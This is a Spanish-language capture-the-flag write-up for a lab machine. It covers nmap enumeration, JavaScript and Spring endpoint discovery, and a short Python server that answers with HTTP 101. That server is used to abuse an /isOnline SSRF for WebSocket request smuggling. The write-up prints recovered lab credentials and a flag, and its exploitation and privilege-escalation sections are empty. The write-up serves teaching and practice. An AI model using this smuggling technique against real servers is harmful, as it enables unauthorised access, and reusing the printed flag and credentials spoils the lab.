# Introducción

Nos enfrentamos a una máquina seguramente Linux, difícil después de seguir la ruta de Aplication Pentester esta es la última y bastante complicada

# Test conectividad

![image](https://github.com/user-attachments/assets/4c8e5e1e-b8d5-4aa8-9019-69d5813c93db)

# Enumeración

Enumeramos puertos

```
sudo nmap -sSCV -T4 --min-rate 5000 10.10.237.144
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-25 15:44 GMT
Nmap scan report for 10.10.237.144
Host is up (0.013s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp   open  ssl/http El Bandito Server
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Date: Tue, 25 Feb 2025 15:46:11 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: SAMEORIGIN
|     X-XSS-Protection: 1; mode=block
|     Feature-Policy: microphone 'none'; geolocation 'none';
|     Age: 0
|     Server: El Bandito Server
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Tue, 25 Feb 2025 15:45:21 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 58
|     Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: SAMEORIGIN
|     X-XSS-Protection: 1; mode=block
|     Feature-Policy: microphone 'none'; geolocation 'none';
|     Age: 0
|     Server: El Bandito Server
|     Accept-Ranges: bytes
|     Connection: close
|     nothing to see <script src='/static/messages.js'></script>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Tue, 25 Feb 2025 15:45:21 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 0
|     Allow: OPTIONS, POST, GET, HEAD
|     Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: SAMEORIGIN
|     X-XSS-Protection: 1; mode=block
|     Feature-Policy: microphone 'none'; geolocation 'none';
|     Age: 0
|     Server: El Bandito Server
|     Accept-Ranges: bytes
|     Connection: close
|   RTSPRequest: 
|_    HTTP/1.1 400 Bad Request
|_http-server-header: El Bandito Server
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
| ssl-cert: Subject: commonName=localhost
| Subject Alternative Name: DNS:localhost
| Not valid before: 2021-04-10T06:51:56
|_Not valid after:  2031-04-08T06:51:56
631/tcp  open  ipp      CUPS 2.4
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: CUPS/2.4 IPP/2.1
|_http-title: Home - CUPS 2.4.7
8080/tcp open  http     nginx
|_http-title: Site doesn't have a title (application/json;charset=UTF-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.80%T=SSL%I=7%D=2/25%Time=67BDE591%P=x86_64-pc-linux-gnu%
SF:r(GetRequest,1E5,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Tue,\x2025\x20Feb\
SF:x202025\x2015:45:21\x20GMT\r\nContent-Type:\x20text/html;\x20charset=ut
SF:f-8\r\nContent-Length:\x2058\r\nContent-Security-Policy:\x20default-src
SF:\x20'self';\x20script-src\x20'self';\x20object-src\x20'none';\r\nX-Cont
SF:ent-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-XSS
SF:-Protection:\x201;\x20mode=block\r\nFeature-Policy:\x20microphone\x20'n
SF:one';\x20geolocation\x20'none';\r\nAge:\x200\r\nServer:\x20El\x20Bandit
SF:o\x20Server\r\nAccept-Ranges:\x20bytes\r\nConnection:\x20close\r\n\r\nn
SF:othing\x20to\x20see\x20<script\x20src='/static/messages\.js'></script>"
SF:)%r(HTTPOptions,1CB,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Tue,\x2025\x20F
SF:eb\x202025\x2015:45:21\x20GMT\r\nContent-Type:\x20text/html;\x20charset
SF:=utf-8\r\nContent-Length:\x200\r\nAllow:\x20OPTIONS,\x20POST,\x20GET,\x
SF:20HEAD\r\nContent-Security-Policy:\x20default-src\x20'self';\x20script-
SF:src\x20'self';\x20object-src\x20'none';\r\nX-Content-Type-Options:\x20n
SF:osniff\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-XSS-Protection:\x201;\x20
SF:mode=block\r\nFeature-Policy:\x20microphone\x20'none';\x20geolocation\x
SF:20'none';\r\nAge:\x200\r\nServer:\x20El\x20Bandito\x20Server\r\nAccept-
SF:Ranges:\x20bytes\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,1C,"HT
SF:TP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(FourOhFourRequest,26C,"HTT
SF:P/1\.1\x20404\x20NOT\x20FOUND\r\nDate:\x20Tue,\x2025\x20Feb\x202025\x20
SF:15:46:11\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nCont
SF:ent-Length:\x20207\r\nContent-Security-Policy:\x20default-src\x20'self'
SF:;\x20script-src\x20'self';\x20object-src\x20'none';\r\nX-Content-Type-O
SF:ptions:\x20nosniff\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-XSS-Protectio
SF:n:\x201;\x20mode=block\r\nFeature-Policy:\x20microphone\x20'none';\x20g
SF:eolocation\x20'none';\r\nAge:\x200\r\nServer:\x20El\x20Bandito\x20Serve
SF:r\r\nConnection:\x20close\r\n\r\n<!doctype\x20html>\n<html\x20lang=en>\
SF:n<title>404\x20Not\x20Found</title>\n<h1>Not\x20Found</h1>\n<p>The\x20r
SF:equested\x20URL\x20was\x20not\x20found\x20on\x20the\x20server\.\x20If\x
SF:20you\x20entered\x20the\x20URL\x20manually\x20please\x20check\x20your\x
SF:20spelling\x20and\x20try\x20again\.</p>\n");
MAC Address: 02:79:B4:EA:C4:E7 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 141.48 seconds
```

- 22 ssh
- 80 web
- 8080 web
- 631 CUPS

Enumeramos la web del puerto 80, en la que literalmente nos ponen "nothing to see" si nos vamos al código fuente encontramos:

![image](https://github.com/user-attachments/assets/ccb73ed1-136d-4c63-9c35-a9599e743acf)

Referido a un "messages.js"

Dentro de dicho código encontramos dos endpoints importantes además de dos nombres, Oliver y Jack

```
fetch("/getMessages")

fetch("/send_message", {
```

Si nos vamos a cada ruta encontramos un login y otra web con poca importancia, podemos probar a hacer cosas, pero ya os digo que no vais a llegar a nada

Nos vamos ahora a la 8080

![image](https://github.com/user-attachments/assets/0386cbef-922f-4f0c-bc51-5cba08606f37)

Vamos a enumerar directorios, (en la anteiror también la he hecho pero no he encontrado nada)

En la que os aseguro oque vais a encontrar muuuchas rutas factibles, como admin, administration, info, assets, etc

Nos centraremos por ahora en /burn.html

![image](https://github.com/user-attachments/assets/6347f831-c3bd-4624-83d8-2570b298a627)

En el formulario podemos sacar, si nos vamos a lcódigo fuente y lo que se ejecuta vemos un webshocket lo anteriormente que he mos visto en el write

![image](https://github.com/user-attachments/assets/59d12b7d-8f50-4af0-a791-fb428a31ce19)

Parece ser que llamando a la funcion y cogiendo el /ws

Vamos a mirar otros directorios encontrados como /services.html

![image](https://github.com/user-attachments/assets/dc0286ec-87ef-4fe0-8c3a-733160051a60)

Si vemos el código fuente encontramos un js

```
const serviceURLs = [
  "http://bandito.websocket.thm",
  "http://bandito.public.thm"
];

async function checkServiceStatus() {
  for (let serviceUrl of serviceURLs) {
    try {
       const response = await fetch(`/isOnline?url=${serviceUrl}`, {
        method: 'GET', 
      });

      if (response.ok) {
        let existingContent = document.getElementById("output").innerHTML;
        document.getElementById("output").innerHTML = `${existingContent}<br/>${serviceUrl}: <strong>ONLINE</strong>`;
      } else {
        throw new Error('Service response not OK');
      }
    } catch (error) {
      let existingContent = document.getElementById("output").innerHTML;
      document.getElementById("output").innerHTML = `${existingContent}<br/>${serviceUrl}: <strong>OFFLINE</strong>`;
    }
  }
}
```

Si vemos esto redirigue a un Spring vamos a hacer un 404

![image](https://github.com/user-attachments/assets/92e292b2-de45-4c6d-9fb6-d79f66555055)

# Primera flag

Una vez sabemos como funciona podemos mapear con /env o /mappings

en /env encontramos un 403

pero en /mappings encontramos dos enpoints interesantes:

- /admin-flag
- /admin-creds

Pero no tenemos acceso a ningun recurso de ellos

Vamos a probar si el request smuggling es funciona cogiendo el servidor que antes hemos cogido en el waltrought

```
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 1:
    print("""
Usage: {}
    """.format(sys.argv[0]))
    sys.exit()

class Redirect(BaseHTTPRequestHandler):
   def do_GET(self):
       self.protocol_version = "HTTP/1.1"
       self.send_response(101)
       self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
```

pythone 3 server.py 5555

![image](https://github.com/user-attachments/assets/e6a24a4f-d76a-4418-b607-bd5eddd1c5d7)

Obviamente ternemos que apuntar al endpoint anteriomente visto Isonline

![image](https://github.com/user-attachments/assets/e8acf43c-595d-4c29-a368-595049ba561f)

Comprobadito que funciona jeje

Vamos a ahcer lo mismo que en el waltrough a ver si funciona

![image](https://github.com/user-attachments/assets/c1c7be45-e552-4837-b145-b2cd22244acd)

![image](https://github.com/user-attachments/assets/5f7e2494-5007-4d35-bce0-29002c7b6236)

Después de un montón de intentos tenemos el user y pass

![image](https://github.com/user-attachments/assets/36172fdf-2134-44db-854c-8be7a1d7a5a9)

username:hAckLIEN password:YouCanCatchUsInYourDreams404

Ahora vamos a por la flag jeje

![image](https://github.com/user-attachments/assets/07382d64-fa1a-4e80-868d-8bf2a910c3d7)

```
THM{:::MY_DECLINATION:+62°_14\'_31.4'':::}
```

AMasin jaja

Nos vamos a llogin de antes

![image](https://github.com/user-attachments/assets/56685a16-a2da-43b1-b9d0-fea815a40b14)

![image](https://github.com/user-attachments/assets/bb5157a0-32c7-4f07-a649-ed8501e52847)

Estamos con Jack y Oliver

Y ahora podemos correlacionar lo anterior, del SendMessager y Recibe y los endpoints y jugar con ellos

![image](https://github.com/user-attachments/assets/12b32216-72cc-44e6-adb2-01d68710b855)






# Explotación

# Escala de privilegios
